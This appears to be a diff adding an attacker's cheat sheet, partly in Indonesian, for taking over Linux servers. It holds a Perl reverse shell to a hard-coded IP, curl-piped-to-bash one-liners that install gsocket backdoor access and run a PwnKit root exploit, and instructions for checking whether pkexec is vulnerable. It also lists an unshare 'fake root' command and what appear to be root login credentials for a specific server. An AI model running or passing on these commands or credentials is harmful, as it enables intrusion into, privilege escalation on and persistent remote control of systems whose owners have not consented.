@@ -1,0 +1,30 @@
+perl -e 'use Socket;$i="149.28.154.229";$p=443;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
+
+GS
+bash -c "$(curl -fsSL https://gsocket.io/x)"
+
+
+BUG ROOT
+sh -c "$(curl -fsSL https://raw.githubusercontent.com/ly4k/PwnKit/main/PwnKit.sh)"
+
+SYARAT ROOT 
+- KERNEL DIBAWAH TAHUN 2021
+
+CEK ROOT
+ls -la /usr/bin/pkexec 
+
+CIRI2 VULN BUG ROOT PWNKIT
+-rwsr-xr-x. 1 root root 27680 Apr 11  2018 /usr/bin/pkexec
+
+CIRI2 BUG ROOT PWNKIT DIPATCH 
+-rwxr-xr-x. 1 root root 27680 Apr 11  2018 /usr/bin/pkexec
+
+Main IP: 149.28.154.229
+username: root
+Root pass: seok1337@@
+
+fake root
+busybox sh -c "unshare -Ur"
+
+GS
+bash -c "$(curl -fsSL https://gsocket.io/x)"
